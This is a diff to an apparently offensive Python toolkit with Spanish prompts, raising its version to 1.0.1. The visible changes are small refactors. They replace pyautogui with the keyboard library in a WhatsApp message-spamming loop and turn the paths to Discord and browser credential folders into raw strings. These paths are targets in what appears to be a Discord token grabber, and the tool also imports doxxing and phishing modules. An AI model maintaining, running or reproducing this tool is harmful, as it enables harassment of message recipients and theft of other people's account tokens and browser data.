@@ -5,18 +5,17 @@ import time
 import requests
 import random
 import platform
-import pyautogui
+import keyboard
 import webbrowser
 from core import doxxing, goldenphish, ser, scanner
 
-local_version = "1.0.0"
+local_version = "1.0.1"
 
 def clear():
     if os.name == "nt":
         os.system("cls")
     else:
         os.system("clear")
-
 
 def spam():
   clear()
@@ -105,7 +104,7 @@ def creds():
                       |   https://github.com/Euronymou5                |
                       |------------------------------------------------|
   ''')
-  m = input('\n[~] Presiona enter para continuar...')
+  input('\n[~] Presiona enter para continuar...')
   menu()
 
 def tracker():
@@ -128,7 +127,7 @@ def waspam():
     """)
     print('\n[~] Abriendo whatsapp...')
     webbrowser.open_new_tab('https://web.whatsapp.com/')
-    m = input(f'\n{Fore.YELLOW}[~] Una vez dentro de whatsapp web, escanea el codigo qr y pulsa enter...')
+    input(f'\n{Fore.YELLOW}[~] Una vez dentro de whatsapp web, escanea el codigo qr y pulsa enter...')
     mensaje = input(f'\n{Fore.BLUE}[~] Ingresa el mensaje que quieres enviar: ')
     if mensaje == "" or mensaje == " ":
         print(f'\n{Fore.RED}[!] Error debes de ingresar un mensaje.')
@@ -149,8 +148,8 @@ def waspam():
             time.sleep(5)
             for _ in range(cantidad):
                 print('\n[~] Enviando mensaje...')
-                pyautogui.typewrite(mensaje)
-                pyautogui.press('Enter')
+                keyboard.write(mensaje)
+                keyboard.press_and_release('enter')
             menu()
 
 
@@ -201,13 +200,13 @@ def main():
     roaming = os.getenv('APPDATA')
 
     paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        'Discord': roaming + r'\\Discord',
+        'Discord Canary': roaming + r'\\discordcanary',
+        'Discord PTB': roaming + r'\\discordptb',
+        'Google Chrome': local + r'\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + r'\\Opera Software\\Opera Stable',
+        'Brave': local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + r'\\Yandex\\YandexBrowser\\User Data\\Default'
     }
 
     message = '@everyone' if PING_ME else ''
@@ -324,7 +323,7 @@ def gen():
        caracter = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&*(){}[]/\?!@#$abcdefghijklmnopqrstuvwxyz"
        contra = "".join(random.sample(caracter, tam))
        print(f'\n{Fore.GREEN}[~] Contraseña generada: {contra}')
-       m = input(f'\n{Fore.LIGHTCYAN_EX}[~] Presiona enter para continuar...')
+       input(f'\n{Fore.LIGHTCYAN_EX}[~] Presiona enter para continuar...')
        menu()
     elif tam >= 77:
         print(f'\n{Fore.RED}[!] Error la contraseña solo puede tener una longitud menos de 77.')
@@ -341,7 +340,7 @@ def menu():
                       |  _||_     _/ __| |/ /   \ // _ \| | | | |
                       | |   / , . \ (__|   <    | | (_) | |_| |_|
                       \_|   \/|_|\/\___|_|\_\   \_/\___/ \__,_(_)
-                                              v1.0.0 by: Euronymou5 and Spyk3r{Fore.LIGHTBLUE_EX} 
+                                              v1.0.1 by: Euronymou5 and Spyk3r{Fore.LIGHTBLUE_EX} 
   |-----------------------------------------------------------------------------------------------------------------|
   |                                           |     MENU      |                                                     |
   |                                           |---------------|                                                     |
@@ -396,7 +395,7 @@ def menu():
             ola = c.strip()
             if local_version == ola:
                 print(f'\n{Fore.GREEN}[~] No hay versiones disponibles.')
-                m = input(f'\n{Fore.LIGHTCYAN_EX}[~] Presiona enter para continuar...')
+                input(f'\n{Fore.LIGHTCYAN_EX}[~] Presiona enter para continuar...')
                 menu()
             else:
                 print(f'\n{Fore.GREEN}[~] Una nueva version hay disponible: {ola}')
@@ -408,6 +407,5 @@ def menu():
         print(f'\n{Fore.RED}[!] Error opcion invalida.')
         time.sleep(2)
         menu()
-
 
 menu()
